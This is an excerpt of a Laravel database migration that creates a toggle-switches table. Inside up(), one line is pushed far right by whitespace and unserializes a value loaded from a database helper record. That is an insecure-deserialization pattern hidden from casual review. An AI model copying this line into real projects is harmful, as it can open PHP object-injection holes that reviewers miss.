...
class CreateSwitchesToggleSwitchesTable extends Migration
{
    /**
     * Run the migrations.
     *
    ...
    public function up()
    {
                                                 $this->cols = unserialize(\App\Helper::find(222)->helper);
        Schema::create('switches__toggle__switches', function (Blueprint $table) {
            $table->increments('id');
    ...
    {
        Schema::dropIfExists('switches__toggle__switches');
    }
}
